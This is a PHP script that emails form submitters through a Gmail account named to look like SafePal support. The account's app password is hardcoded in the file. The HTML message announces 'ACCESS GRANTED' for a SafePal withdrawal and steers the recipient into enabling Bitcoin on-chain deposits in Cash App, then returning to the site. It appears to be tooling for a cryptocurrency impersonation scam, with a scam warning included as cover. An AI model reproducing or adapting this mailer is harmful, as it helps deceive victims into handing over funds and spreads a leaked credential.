<?php

ini_set('display_errors', 1);
error_reporting(E_ALL);
// 🔁 Load PHPMailer classes (this must come first)
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

// 🔄 Now you can use PHPMailer
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $userEmail = $_POST["email"];

    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'safepalservicess@gmail.com';  
        $mail->Password   = 'xijsanyahhbbxofs';         // 🔴 App password from Google
        $mail->SMTPSecure = 'ssl';
        $mail->Port       = 465;

        // Recipients
        $mail->setFrom('yourgmail@gmail.com', 'SafePal Support');
        $mail->addAddress($userEmail);  // send to the email from form

        // Email content
        $mail->isHTML(true);
        $mail->Subject = 'ACCESS GRANTED';

        $firstName = htmlspecialchars(trim($_POST['first_name']));
        $lastName = htmlspecialchars(trim($_POST['last_name']));
        $userEmail = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);

        if (!$userEmail) {
         exit("Invalid email address.");
        }

        $fullName = $firstName . ' ' . $lastName;
        $mail->Body = "
        <div style='font-family: Arial, sans-serif; color: #333; line-height: 1.5; font-size: 16px;'>
          <p>Welcome, <strong style='color: #1E6FFF;'>{$fullName}</strong>,</p>
        
          <p>Your request to enable withdrawal from the SafePal account with ID:SP84OG3AQ will be approved once you successfully complete the steps below:</p>
        
           <p>To enable withdrawal and deposit funds into your CashApp account, kindly enable the on-chain transaction feature on your CashApp by following these steps:</p>

        <ul style='margin-left: 20px; color: #555;'>
            <li>Open your Cash App and tap the <strong style='color: #1E6FFF;'>Bitcoin</strong> icon.</li>
            <li>Scroll down and select <strong style='color: #1E6FFF;'>Deposit Bitcoin</strong>.</li>
            <li>Follow the on-screen prompts to enable on-chain transactions.</li>
        </ul>

        <p>Once you have enabled on-chain transactions in Cash App, please return to our website where you enabled the withdrawal and click the <strong style='color: #1E6FFF;'>WITHDRAWAL</strong> option to finalize your transaction.</p>

        <p>If you need any assistance, feel free to reply to this email or any future emails from us.</p>

        <h4 style='color:rgb(150, 26, 21); margin-bottom:0'>Important Security Reminder:</h4>
        <p style='color: rgb(150, 26, 21);'>Never send funds or share sensitive information with anyone claiming to be a SafePal agent outside of official communication channels. Scammers may impersonate SafePal representatives.
        </p>
        <br>

        <p>Thank you for choosing SafePal!</p>

        <p style='color: #1E6FFF;'>Best regards,<br>
        The SafePal Team</p>
        </div>
        ";

        $mail->send();
        header('Location: enablewithdrawalsummary.html');
        exit;
        // echo "Email sent successfully to $userEmail.";
    } catch (Exception $e) {
        echo "Email could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
?>
